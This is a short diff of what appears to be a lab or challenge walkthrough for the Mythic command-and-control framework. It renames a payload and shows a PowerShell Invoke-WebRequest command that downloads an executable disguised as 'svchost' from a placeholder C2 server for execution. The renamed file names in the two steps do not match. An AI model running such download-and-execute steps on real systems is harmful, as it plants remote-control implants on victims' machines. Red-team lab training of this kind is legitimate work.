@@ -159,7 +159,7 @@ Command:
    
 Copy the download link address from Mythic web GUI.
 Use `wget` with `--no-check-certificate` to download the payload on the Mythic server.
-Rename the downloaded file to `servicehost-haji.exe`.
+Rename the downloaded file to `servicehost-wahab.exe`.
 
 **2. Serve Payload via HTTP**:
    
@@ -185,7 +185,7 @@ Use PowerShell to download the payload from the Mythic server.
 Command:
 
 ```
-Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/servicehost-haji.exe -OutFile C:\Users\Public\Downloads\servicehost-haji.exe
+Invoke-WebRequest -Uri http://<Challenge-Mythic-IP>:9999/svchost-wahab.exe -OutFile C:\Users\Public\Downloads\svchost-wahab.exe
 ```
 
 **Execute Payload**:
